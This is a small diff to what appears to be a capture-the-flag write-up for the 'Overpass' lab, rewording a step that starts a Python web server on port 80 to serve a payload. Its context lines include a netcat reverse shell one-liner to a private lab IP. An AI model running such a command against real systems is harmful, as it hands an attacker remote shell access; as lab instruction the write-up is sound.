@@ -709,7 +709,7 @@ Create the Web Structure: Create the directory path that matches the URL used by
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.157.156 1234 >/tmp/f
 ```
 
-Start a python **webserver** on **port 80** on the attacker machine.
+Start a python **webserver**: Start a simple Python HTTP server on the standard HTTP port (`**Port 80**`) from the root directory of the payload (`~/.../Overpass/`).
 
 Command: `python3 -m http.server 80`
 
